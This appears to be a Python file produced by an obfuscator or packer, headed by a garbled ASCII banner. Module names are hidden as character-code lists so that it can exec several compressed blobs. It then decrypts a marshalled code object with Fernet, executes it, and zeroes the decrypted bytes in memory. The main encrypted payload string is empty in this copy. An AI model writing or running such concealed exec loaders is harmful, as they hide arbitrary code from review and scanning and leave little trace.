'''
  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
 ‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù
 ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
 ‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù
 ‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë
  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù      ü•©
'''
file = globals()["__file__"]
def _x(p): getattr(__import__(''.join(map(chr, [98, 117, 105, 108, 116, 105, 110, 115]))), ''.join(map(chr, [101, 120, 101, 99])))(getattr(__import__(''.join(map(chr, [109, 97, 114, 115, 104, 97, 108]))), ''.join(map(chr, [108, 111, 97, 100, 115])))(getattr(__import__(''.join(map(chr, [122, 108, 105, 98]))), ''.join(map(chr, [100, 101, 99, 111, 109, 112, 114, 101, 115, 115])))(getattr(__import__(''.join(map(chr, [98, 97, 115, 101, 54, 52]))), ''.join(map(chr, [98, 54, 52, 100, 101, 99, 111, 100, 101])))(p))), globals(), {"__file__": file})
_x(b'eJwr5mJgYMjMLcgvKlEoriwGAB3+BJg=')
_x(b'eJwr5mVgYMjMLcgvKlFISixONTMBACzqBUE=')
_x(b'eJwr5mZgYMjMLcgvKlGoyslMAgAi6ATr')
_x(b'eJwr5mNgYMjMLcgvKlHITSwqzkjMAQA0GQYl')
_x(b'eJwr5mVgYMjMLcgvKlFILqksSC0GAC4lBdQ=')
_x(b'eJwrVmNgYEgrys9VSC6qLCjJTy9KLMio1EtLLcpLLVHIzC3ILypRcAPzAD/TD4s=')
_x(b'eJwr5mZgYMjMLcgvKlHITSzJAAAirwTk')
_x(b'eJwr5mVgYMjMLcgvKlEoSsxLyc8FAC3eBb0=')
_x(b'eJwr5mVgYMjMLcgvKlFILEmtyCwBAC3qBcs=')
_x(b'eJwr5mRgYMjMLcgvKlEoSgUAGUMEDw==')
_x(b'eJwrFmRgYMjMLcgvKlEoLk0qKMpPTi0uBgBKCAeJ')
_x(b'eJwr5mZgYMjMLcgvKlEoycxNBQAi0gTp')
_x(b'eJwrNmRgYEgrys9VSM7PSy4tKkrNK9FLKy0pLUotVsjMLcgvKlEIyShKTUwJyM/Pca1ITS4tyS8CAAZAFBQ=')
_x(b'eJwr5mVgYMjMLcgvKlEoKC4tycwBAC5rBd0=')
_x(b'eJwr5mRgYMjMLcgvKlHILwYAGUsEGg==')
_x(b'eJwr5mVgYMjMLcgvKlEozigtycwBAC5GBdU=')
_x(b'eJwr5mdgYMjMLcgvKlEoSc0tSMvMSQUAOu0GlA==')
_x(b'eJwrFmRgYMjMLcgvKlEoLk0qKMpPTi0uBgBKCAeJ')
_x(b'eJwrFmBgYMjMLcgvKlHITSzJUEgsVsgFAD+xBmo=')

import base64
_beef_sk = [39, 156, 69, 216, 220, 50, 104, 115, 30, 212, 169, 73, 4, 244, 178, 95]
def _beef_sd(s):
    d = base64.b64decode(s.encode('utf-8'))
    k = bytes(_beef_sk)
    return bytes([b ^ k[i % len(k)] for i, b in enumerate(d)]).decode('utf-8')

def _d(d, k):
    _m, _a, _f, _x = (getattr(getattr(__import__(''.join(map(chr, [98, 117, 105, 108, 116, 105, 110, 115]))), ''.join(map(chr, [95, 95, 105, 109, 112, 111, 114, 116, 95, 95])))(''.join(map(chr, [111, 112, 101, 114, 97, 116, 111, 114]))), ''.join(map(chr, n))) for n in [[109, 117, 108], [97, 100, 100], [102, 108, 111, 111, 114, 100, 105, 118], [120, 111, 114]])
    _k_ext = _m(k, _a(_f(len(d), len(k)), 1))
    return bytes(map(_x, d, _k_ext))
_f = []
_g = lambda m, f: getattr(__import__(''.join(map(chr, m))), ''.join(map(chr, f)))
_b = ''.join(map(chr, [98, 117, 105, 108, 116, 105, 110, 115]))
_f.append(getattr(__import__(_b), ''.join(map(chr, [98, 121, 116, 101, 115]))))
_f.append(_g([98, 97, 115, 101, 54, 52], [98, 54, 52, 100, 101, 99, 111, 100, 101]))
_f.append(_g([109, 97, 114, 115, 104, 97, 108], [108, 111, 97, 100, 115]))
_f.append(_g([122, 108, 105, 98], [100, 101, 99, 111, 109, 112, 114, 101, 115, 115]))
_f.append(getattr(__import__(''.join(map(chr, [99, 114, 121, 112, 116, 111, 103, 114, 97, 112, 104, 121, 46, 102, 101, 114, 110, 101, 116])), fromlist=[''.join(map(chr, [70, 101, 114, 110, 101, 116]))]), ''.join(map(chr, [70, 101, 114, 110, 101, 116]))))
_f.append(getattr(__import__(_b), ''.join(map(chr, [98, 121, 116, 101, 97, 114, 114, 97, 121]))))
_f.append(getattr(__import__(_b), ''.join(map(chr, [109, 101, 109, 111, 114, 121, 118, 105, 101, 119]))))
_f.append(getattr(__import__(_b), ''.join(map(chr, [101, 120, 101, 99]))))
_f.append(_d)
_f.append(getattr(__import__(''.join(map(chr, [99, 116, 121, 112, 101, 115]))), ''.join(map(chr, [99, 95, 99, 104, 97, 114]))))
_f.append(getattr(__import__(''.join(map(chr, [99, 116, 121, 112, 101, 115]))),''.join(map(chr, [97, 100, 100, 114, 101, 115, 115, 111, 102]))))
_f.append(getattr(__import__(''.join(map(chr, [99, 116, 121, 112, 101, 115]))),''.join(map(chr, [109, 101, 109, 115, 101, 116]))))
_f.append(getattr(__import__(''.join(map(chr, [114, 97, 110, 100, 111, 109]))), ''.join(map(chr, [114, 97, 110, 100, 105, 110, 116]))))
_f.append(getattr(__import__(''.join(map(chr, [122, 101, 114, 111, 105, 122, 101]))), ''.join(map(chr, [122, 101, 114, 111, 105, 122, 101, 49]))))
_f.append(getattr(__import__(''.join(map(chr, [122, 101, 114, 111, 105, 122, 101]))), ''.join(map(chr, [109, 108, 111, 99, 107]))))
_f.append(getattr(__import__(''.join(map(chr, [122, 101, 114, 111, 105, 122, 101]))), ''.join(map(chr, [109, 117, 110, 108, 111, 99, 107]))))
_d_f = ''
_k_m = [167, 203, 69, 140, 73, 107, 56, 26, 53, 201, 123, 247, 229, 239, 170, 132, 231, 86, 139, 19, 16, 127, 233, 226, 149, 56, 36, 170, 225, 136, 15, 255, 139, 155, 85, 106, 208, 117, 247, 151, 18, 177, 94, 146]
_k_md = [237, 170, 60, 252, 100, 0, 121, 64, 69, 177, 23, 168, 145, 130, 227, 189, 159, 27, 192, 76, 103, 47, 186, 161, 241, 122, 114, 237, 162, 187, 60, 190, 190, 208, 0, 26, 158, 77, 180, 160, 67, 231, 23, 175]
_v_k = _f[8](_f[0](_k_md), _f[0](_k_m))
_v_c = _f[4](_v_k)
_p1 = _f[1](_d_f)
_p2 = _f[2](_p1)
_p3 = _f[3](_p2)
_p4 = _f[1](_p3)
_v_d_b = getattr(_v_c, ''.join(map(chr, [100, 101, 99, 114, 121, 112, 116])))(_p4)
_v_m = _f[6](_v_d_b)
_f[7](_f[2](_v_m.tobytes()))
try:
    for pattern in [0x00, 0xFF, _f[12](0, 255)]:
        _f[11](_f[10](_f[9].from_buffer(bytearray(_v_d_b))), pattern, len(_v_d_b))
        _f[11](_f[10](_f[9].from_buffer(bytearray(_v_m))), pattern, len(_v_m))
except:
    pass 
del _d_f, _k_m, _k_md, _v_k, _v_c, _p1, _p2, _p3, _p4, _v_d_b, _v_m, _f, _g, _b